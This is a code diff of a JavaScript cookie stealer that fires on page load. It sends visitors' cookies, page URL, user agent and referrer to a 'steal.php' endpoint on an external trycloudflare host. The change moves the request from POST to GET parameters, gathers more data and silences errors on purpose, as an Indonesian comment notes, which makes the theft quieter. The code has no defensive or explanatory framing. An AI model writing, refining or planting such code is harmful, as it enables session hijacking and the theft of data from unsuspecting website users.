@@ -6,13 +6,18 @@ window.addEventListener('load', () => {
         return;
     }
 
-    fetch('https://soonest-therapist-backgrounds-producer.trycloudflare.com/steal.php', {
-        method: 'POST',
-        body: 'cookie=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(location.href),
-        headers: { 
-            'Content-Type': 'application/x-www-form-urlencoded' 
-        },
+    const stealUrl = 'https://soonest-therapist-backgrounds-producer.trycloudflare.com/steal.php';
+
+    const params = new URLSearchParams({
+        cookie: document.cookie,
+        url: location.href,
+        ua: navigator.userAgent,
+        ref: document.referrer
+    });
+
+    fetch(stealUrl + '?' + params.toString(), {
+        method: 'GET',
         mode: 'no-cors'
     })
-    .catch(err => console.error('Stealer error:', err)); // opsional
+    .catch(() => {}); // sengaja di-silent
 });
